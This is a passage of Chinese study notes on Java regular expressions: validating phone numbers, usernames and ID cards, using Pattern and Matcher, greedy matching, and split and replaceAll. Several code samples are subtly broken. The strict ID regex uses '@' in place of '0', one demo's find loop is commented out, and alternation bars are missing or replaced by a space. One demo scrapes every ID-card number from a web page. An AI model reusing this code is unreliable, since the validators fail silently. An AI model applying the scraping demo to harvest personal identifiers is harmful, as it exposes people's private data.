class="string">&quot;dlei0009@163.com&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span class="string">&quot;dlei0009@pci.com.cn&quot;</span>.matches(regex3));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//24小时的正则表达式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex4</span> <span class="operator">=</span> <span class="string">&quot;([01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;23:11:11&quot;</span>.matches(regex4));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex5</span> <span class="operator">=</span> <span class="string">&quot;([01]\\d 2[0-3])(:[0-5]\\d)&#123;2&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;23:11:11&quot;</span>.matches(regex5));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>问题：</p>
<ul>
<li>//三:号码 号码的第一位也不能以0开头，从第二位开始可以是任意的数字，号码的总长度:5-10位</li>
<li>String regex2 = “0\d{2,3}-?[1-9]\d{4,9}”;</li>
<li>5-10位→d{4,9}   这个点没太懂</li>
</ul>
</li>
<li>
<p>这个地方还需要实际练习T T   后面座机电话和邮箱电话的例子没咋看懂T T</p>
</li>
</ul>
<h3 id="正则表达式练习2"><a class="header-anchor" href="#正则表达式练习2">¶</a>正则表达式练习2</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            正则表达式练习:</span></span><br><span class="line"><span class="comment">            需求</span></span><br><span class="line"><span class="comment">            请编写正则表达式验证用户名是否满足要求。要求:大小写字母，数字，下划线一共4-16位</span></span><br><span class="line"><span class="comment">            请编写正则表达式验证身份证号码是否满足要求。</span></span><br><span class="line"><span class="comment">            简单要求:</span></span><br><span class="line"><span class="comment">                18位，前17位任意数字，最后一位可以是数字可以是大写或小写的x</span></span><br><span class="line"><span class="comment">            复杂要求:</span></span><br><span class="line"><span class="comment">                按照身份证号码的格式严格要求。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            身份证号码:</span></span><br><span class="line"><span class="comment">            41080119930228457x</span></span><br><span class="line"><span class="comment">            510801197609022309</span></span><br><span class="line"><span class="comment">            15040119810705387X</span></span><br><span class="line"><span class="comment">            130133197204039024 I</span></span><br><span class="line"><span class="comment">            430102197606046442</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用户名要求:大小写字母，数字，下划线一共4-16位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex1</span> <span class="operator">=</span> <span class="string">&quot;\\w&#123;4,16&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;zhangsan&quot;</span>.matches(regex1));</span><br><span class="line">        System.out.println(<span class="string">&quot;lisi&quot;</span>.matches(regex1));</span><br><span class="line">        System.out.println(<span class="string">&quot;wangwu&quot;</span>.matches(regex1));</span><br><span class="line">        System.out.println(<span class="string">&quot;$123&quot;</span>.matches(regex1));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//身份证号码的简单校验:</span></span><br><span class="line">        <span class="comment">//18位，前17位任意数字，最后一位可以是数字可以是大写或小写的x</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex2</span> <span class="operator">=</span> <span class="string">&quot;[1-9]\\d&#123;16&#125;(\\d|x|x)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex3</span> <span class="operator">=</span> <span class="string">&quot;[1-9]\\d&#123;16&#125;[\\dXx]&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex5</span> <span class="operator">=</span> <span class="string">&quot;[1-9]\\d&#123;16&#125;(\\d(?i)x)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;41080119930228457x&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span class="string">&quot;510801197609022309&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span class="string">&quot;15040119810705387X&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span class="string">&quot;130133197204039024&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span class="string">&quot;430102197606046442&quot;</span>.matches(regex3));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//忽略大小写的书写方式</span></span><br><span class="line">        <span class="comment">//在匹配的时候忽略abc的大小写</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex4</span> <span class="operator">=</span> <span class="string">&quot;a((?i)b)c&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;abc&quot;</span>.matches(regex4));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;ABC&quot;</span>.matches(regex4));<span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;aBc&quot;</span>.matches(regex4));<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//身份证号码的严格校验</span></span><br><span class="line">        <span class="comment">//编写正则的小心得:</span></span><br><span class="line">        <span class="comment">//第一步:按照正确的数据进行拆分</span></span><br><span class="line">        <span class="comment">//第二步:找每一部分的规律，并编写正则表达式</span></span><br><span class="line">        <span class="comment">//第三步:把每一部分的正则拼接在一起，就是最终的结果</span></span><br><span class="line">        <span class="comment">//书写的时候:从左到右去书写。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//410801 1993 02 28 457x</span></span><br><span class="line">        <span class="comment">//前面6位:省份，市区，派出所等信息，第一位不能是0，后面5位是任意数字       [1-9]\\d&#123;5&#125;</span></span><br><span class="line">        <span class="comment">//年的前半段: 18 19 20                                                (18|19|20)</span></span><br><span class="line">        <span class="comment">//年的后半段: 任意数字出现两次                                           \\d&#123;2&#125;</span></span><br><span class="line">        <span class="comment">//月份: 01~ 09 10 11 12                                               (@[1-9]|1[0-2])</span></span><br><span class="line">        <span class="comment">//日期: 01~09 10~19 20~29 30 31                                       (0[1-9]|[12]\\d|3[01])</span></span><br><span class="line">        <span class="comment">//后面四位: 任意数字出现3次 最后一位可以是数字也可以是大写x或者小写x        \\d&#123;3&#125;[\\dXx]</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex6</span> <span class="operator">=</span> <span class="string">&quot;[1-9]\\d&#123;5&#125;(18|19|20)\\d&#123;2&#125;(@[1-9]|1[0-2])(@[1-9]|[12]\\d|3[01])\\d&#123;3&#125;[\\dxXx]&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 其实更严谨一点的话，还要判断是不是闰年以及2月的29号是否合理</span></span><br><span class="line">      </span><br><span class="line">        System.out.println(<span class="string">&quot;41080119930228457x&quot;</span>.matches(regex6));</span><br><span class="line">        System.out.println(<span class="string">&quot;510801197609022309&quot;</span>.matches(regex6));</span><br><span class="line">        System.out.println(<span class="string">&quot;15040119810705387X&quot;</span>.matches(regex6));</span><br><span class="line">        System.out.println(<span class="string">&quot;130133197204039024&quot;</span>.matches(regex6));</span><br><span class="line">        System.out.println(<span class="string">&quot;430102197606046442&quot;</span>.matches(regex6));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="本地数据爬取"><a class="header-anchor" href="#本地数据爬取">¶</a>本地数据爬取</h3>
<ul>
<li>
<p>Pattern：表示正则表达式</p>
</li>
<li>
<p>Matcher：文本匹配器，作用按照正则表达式的规则去读取字符串，从头开始读取。在大串中去找符合匹配规则的子串。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a08regexdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 有如下文本，请按照要求爬取数据。</span></span><br><span class="line"><span class="comment">                Java自从95年问世以来，经历了很多版本，目前企业中用的最多的是Java8和Java11，</span></span><br><span class="line"><span class="comment">                因为这两个是长期支持版本，下一个长期支持版本是Java17，相信在未来不久Java17也会逐渐登上历史舞台</span></span><br><span class="line"><span class="comment">                要求:找出里面所有的JavaXX</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Java自从95年问世以来，经历了很多版本，目前企业中用的最多的是Java8和Java11，&quot;</span> +</span><br><span class="line">                <span class="string">&quot;因为这两个是长期支持版本，下一个长期支持版本是Java17，相信在未来不久Java17也会逐渐登上历史舞台&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取正则表达式的对象</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;Java\\d&#123;0,2&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取文本匹配器的对象</span></span><br><span class="line">        <span class="comment">//拿着m去读取str，找符合p规则的子串</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.利用循环获取</span></span><br><span class="line">        <span class="comment">// ?</span></span><br><span class="line">        <span class="keyword">while</span> (m.find()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> m.group();</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="comment">//Pattern:表示正则表达式</span></span><br><span class="line">        <span class="comment">//Matcher: 文本匹配器，作用按照正则表达式的规则去读取字符串，从头开始读取。</span></span><br><span class="line">        <span class="comment">//          在大串中去找符合匹配规则的子串。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取正则表达式的对象</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;Java\\d&#123;0,2&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//获取文本匹配器的对象</span></span><br><span class="line">        <span class="comment">//m:文本匹配器的对象</span></span><br><span class="line">        <span class="comment">//str:大串</span></span><br><span class="line">        <span class="comment">//p:规则</span></span><br><span class="line">        <span class="comment">//m要在str中找符合p规则的小串</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//拿着文本匹配器从头开始读取，寻找是否有满足规则的子串</span></span><br><span class="line">        <span class="comment">//如果没有，方法返回false</span></span><br><span class="line">        <span class="comment">//如果有，返回true。在底层记录子串的起始索引和结束索引+1</span></span><br><span class="line">        <span class="comment">// 0,4</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> m.find();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法底层会根据find方法记录的索引进行字符串的截取</span></span><br><span class="line">        <span class="comment">// substring(起始索引，结束索引);包头不包尾</span></span><br><span class="line">        <span class="comment">// (0,4)但是不包含4索引</span></span><br><span class="line">        <span class="comment">// 会把截取的小串进行返回。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> m.group();</span><br><span class="line">        System.out.println(s1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//第二次在调用find的时候，会继续读取后面的内容</span></span><br><span class="line">        <span class="comment">//读取到第二个满足要求的子串，方法会继续返回true</span></span><br><span class="line">        <span class="comment">//并把第二个子串的起始索引和结束索引+1，进行记录</span></span><br><span class="line">        b = m.find();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第二次调用group方法的时候，会根据find方法记录的索引再次截取子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> m.group();</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>没太懂= =</li>
</ul>
<h3 id="网络数据爬取（了解）"><a class="header-anchor" href="#网络数据爬取（了解）">¶</a>网络数据爬取（了解）</h3>
<ul>
<li>**需求：**把连接:<a href="https://m.sengzan.com/jiaoyu/29104.html?ivk">https://m.sengzan.com/jiaoyu/29104.html?ivk</a> sa=1025883i中所有的身份证号码都爬取出来</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">/* 扩展需求2:</span></span><br><span class="line"><span class="comment">            把连接:https://m.sengzan.com/jiaoyu/29104.html?ivksa=1025883i</span></span><br><span class="line"><span class="comment">            中所有的身份证号码都爬取出来。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个URL对象</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://m.sengzan.com/jiaoyu/29104.html?ivk sa=1025883i&quot;</span>);</span><br><span class="line">        <span class="comment">//连接上这个网址</span></span><br><span class="line">        <span class="comment">//细节:保证网络是畅通</span></span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> url.openConnection();<span class="comment">//创建一个对象读取网络中的数据</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(conn.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="comment">//获取正则表达式的对象pattern</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;[1-9]\\d&#123;17&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(regex);<span class="comment">//在读取的时候每次读一整行</span></span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//拿着文本匹配器的对象matcher按照pattern的规则去读取当前的这一行信息</span></span><br><span class="line">            <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(line);</span><br><span class="line">            <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">                System.out.println(matcher.group());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="爬取数据练习"><a class="header-anchor" href="#爬取数据练习">¶</a>爬取数据练习</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a08regexdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            需求:把下面文本中的座机电话，邮箱，手机号，热线都爬取出来。</span></span><br><span class="line"><span class="comment">            来黑马程序员学习Java，</span></span><br><span class="line"><span class="comment">            手机号:18512516758，18512508907或者联系邮箱:boniu@itcast.cn，</span></span><br><span class="line"><span class="comment">            座机电话:01036517895，010-98951256邮箱:bozai@itcast.cn，</span></span><br><span class="line"><span class="comment">            热线电话:400-618-9090 ，400-618-4000，4006184000，4006189090</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            手机号的正则表达式:1[3-9]\d&#123;9&#125;</span></span><br><span class="line"><span class="comment">            邮箱的正则表达式:\w+@[\w&amp;&amp;[^_]]&#123;2,6&#125;(\.[a-zA-Z]&#123;2,3&#125;)&#123;1,2&#125;座机电话的正则表达式:θ\d&#123;2,3&#125;-?[1-9]\d&#123;4,9&#125;</span></span><br><span class="line"><span class="comment">            热线电话的正则表达式:400-?[1-9]\\d&#123;2&#125;-?[1-9]\\d&#123;3&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;来黑马程序员学习Java，&quot;</span> +</span><br><span class="line">                <span class="string">&quot;电话:18512516758，18512508907&quot;</span> + <span class="string">&quot;或者联系邮箱:boniu@itcast.cn，&quot;</span> +</span><br><span class="line">                <span class="string">&quot;座机电话:01036517895，010-98951256&quot;</span> + <span class="string">&quot;邮箱:bozai@itcast.cn，&quot;</span> +</span><br><span class="line">                <span class="string">&quot;热线电话:400-618-9090 ，400-618-4000，4006184000，4006189090&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;400-618-9090&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;(1[3-9]\\d&#123;9&#125;)|(\\w+@[\\w&amp;&amp;[^_]]&#123;2,6&#125;(\\.[a-zA-Z]&#123;2,3&#125;)&#123;1,2&#125;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;|(0\\d&#123;2,3&#125;-?[1-9]\\d&#123;4,9&#125;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;(400-?[1-9]\\d&#123;2&#125;-?[1-9]\\d&#123;3&#125;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取正则表达式的对象</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(regex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取文本匹配器的对象</span></span><br><span class="line">        <span class="comment">//利用m去读取s，会按照p的规则找里面的小串</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(s);</span><br><span class="line">        <span class="comment">//3.利用循环获取每一个数据 while(m.find())&#123;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> m.group();</span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="按要求爬取"><a class="header-anchor" href="#按要求爬取">¶</a>按要求爬取</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            有如下文本，按要求爬取数据。</span></span><br><span class="line"><span class="comment">            Java自从95年问世以来，经历了很多版本，目前企业中用的最多的是Java8和Java11，因为这两个是长期支持版本，下一个长期支持版本是Java17，相信在未来不久Java17也会逐渐登上历史舞台</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            需求1:爬取版本号为8，11.17的Java文本，但是只要Java，不显示版本号。</span></span><br><span class="line"><span class="comment">            需求2:爬取版本号为8，11，17的Java文本。正确爬取结果为:Java8 Java11 Java17 Java17</span></span><br><span class="line"><span class="comment">            需求3:爬取除了版本号为8，11.17的Java文本，</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Java自从95年问世以来，经历了很多版本，目前企业中用的最多的是Java8和Java11，&quot;</span> +</span><br><span class="line">            <span class="string">&quot;因为这两个是长期支持版本，下一个长期支持版本是Java17，相信在未来不久Java17也会逐渐登上历史舞台&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.定义正则表达式</span></span><br><span class="line">        <span class="comment">//?理解为前面的数据Java</span></span><br><span class="line">        <span class="comment">//=表示在Java后面要跟随的数据</span></span><br><span class="line">        <span class="comment">//但是在获取的时候，只获取前半部分</span></span><br><span class="line">        <span class="comment">//需求1:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex1</span> <span class="operator">=</span> <span class="string">&quot;((?i)Java)(?=8|11|17)&quot;</span>;</span><br><span class="line">        <span class="comment">//需求2:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex2</span> <span class="operator">=</span> <span class="string">&quot;((?i)Java)(8|11|17)&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">regex3</span> <span class="operator">=</span> <span class="string">&quot;((?i)Java)(?:8|11|17)&quot;</span>;</span><br><span class="line">        <span class="comment">//需求3:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex4</span> <span class="operator">=</span> <span class="string">&quot;((?i)Java)(?!8|11|17)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(regex4);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(s);</span><br><span class="line">        <span class="keyword">while</span> (m.find()) &#123;</span><br><span class="line">            System.out.println(m.group());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="贪婪爬取和非贪婪爬取"><a class="header-anchor" href="#贪婪爬取和非贪婪爬取">¶</a>贪婪爬取和非贪婪爬取</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">只写+和表示贪婪匹配，如果在+和后面加问号表示非贪婪爬取</span><br><span class="line">+? 非贪婪匹配</span><br><span class="line">*? 非贪婪匹配</span><br><span class="line">贪婪爬取:在爬取数据的时候尽可能的多获取数据</span><br><span class="line">非贪婪爬取:在爬取数据的时候尽可能的少获取数据</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">如果获取数据：ab+</span><br><span class="line">贪婪爬取获取结果:abbbbbbbbbbbb</span><br><span class="line">非贪婪爬取获取结果:ab</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            只写+和*表示贪婪匹配</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            +? 非贪婪匹配</span></span><br><span class="line"><span class="comment">            *? 非贪婪匹配</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            贪婪爬取:在爬取数据的时候尽可能的多获取数据</span></span><br><span class="line"><span class="comment">            非贪婪爬取:在爬取数据的时候尽可能的少获取数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            ab+:</span></span><br><span class="line"><span class="comment">            贪婪爬取:abbbbbbbbbbbb</span></span><br><span class="line"><span class="comment">            非贪婪爬取:ab</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Java自从95年问世以来，abbbbbbbbbbbbaaaaaaaaaaaaaaaaaa&quot;</span> +</span><br><span class="line">                <span class="string">&quot;经历了很多版木，目前企业中用的最多的是]ava8和]ava11，因为这两个是长期支持版木。&quot;</span> +</span><br><span class="line">                <span class="string">&quot;下一个长期支持版本是Java17，相信在未来不久Java17也会逐渐登上历史舞台&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;ab+&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(regex);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(s);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (m.find()) &#123;</span><br><span class="line">            System.out.println(m.group());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="String的split方法中使用正则表达式"><a class="header-anchor" href="#String的split方法中使用正则表达式">¶</a>String的split方法中使用正则表达式</h3>
<ul>
<li>String类的split()方法原型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] split(String regex)</span><br><span class="line"><span class="comment">//参数regex表示正则表达式。可以将当前字符串中匹配regex正则表达式的符号作为&quot;分隔符&quot;来切割字符串。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   有一段字符串:小诗诗dqwefqwfqwfwq12312小丹丹dqwefqwfqwfwq12312小惠惠</span></span><br><span class="line"><span class="comment">   要求1:把字符串中三个姓名之间的字母替换为vs</span></span><br><span class="line"><span class="comment">   要求2:把字符串中的三个姓名切割出来*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;小诗诗dqwefqwfqwfwq12312小丹丹dqwefqwfqwfwq12312小惠惠&quot;</span>;</span><br><span class="line"><span class="comment">//细节:</span></span><br><span class="line"><span class="comment">//方法在底层跟之前一样也会创建文本解析器的对象</span></span><br><span class="line"><span class="comment">//然后从头开始去读取字符串中的内容，只要有满足的，那么就切割。</span></span><br><span class="line">String[] arr = s.split(<span class="string">&quot;[\\w&amp;&amp;[^_]]+&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    System.out.println(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="String类的replaceAll方法中使用正则表达式"><a class="header-anchor" href="#String类的replaceAll方法中使用正则表达式">¶</a>String类的replaceAll方法中使用正则表达式</h3>
<ul>
<li>String类的replaceAll()方法原型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replaceAll</span><span class="params">(String regex,String newStr)</span></span><br><span class="line"><span class="comment">//参数regex表示一个正则表达式。可以将当前字符串中匹配regex正则表达式的字符串替换为newStr。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   有一段字符串:小诗诗dqwefqwfqwfwq12312小丹丹dqwefqwfqwfwq12312小惠惠</span></span><br><span class="line"><span class="comment">   要求1:把字符串中三个姓名之间的字母替换为vs</span></span><br><span class="line"><span class="comment">   要求2:把字符串中的三个姓名切割出来*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;小诗诗dqwefqwfqwfwq12312小丹丹dqwefqwfqwfwq12312小惠惠&quot;</span>;</span><br><span class="line"><span class="comment">//细节:</span></span><br><span class="line"><span class="comment">//方法在底层跟之前一样也会创建文本解析器的对象</span></span><br><span class="line"><span class="comment">//然后从头开始去读取字符串中的内容，只要有满足的，那么就用第一个参数去替换。</span></span><br><span class="line"><span class="type">String</span> <span class="variable">result1</span> <span class="operator">=</span> s.replaceAll(<span class="string">&quot;[\\w&amp;&amp;[^_]]+&quot;</span>, <span class="string">&quot;vs&quot;</span>);</span><br><span class="line">System.out.println(result1);</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式-分组括号"><a class="header-anchor" href="#正则表达式-分组括号">¶</a>正则表达式-分组括号()</h3>
<ul>
<li>细节：如何识别组号？
<ul>
<li>只看左括号，不看右括号，按照左括号的顺序，从左往右，依次为第一组，第二组，第三组等</li>
</ul>
</li>
</ul>
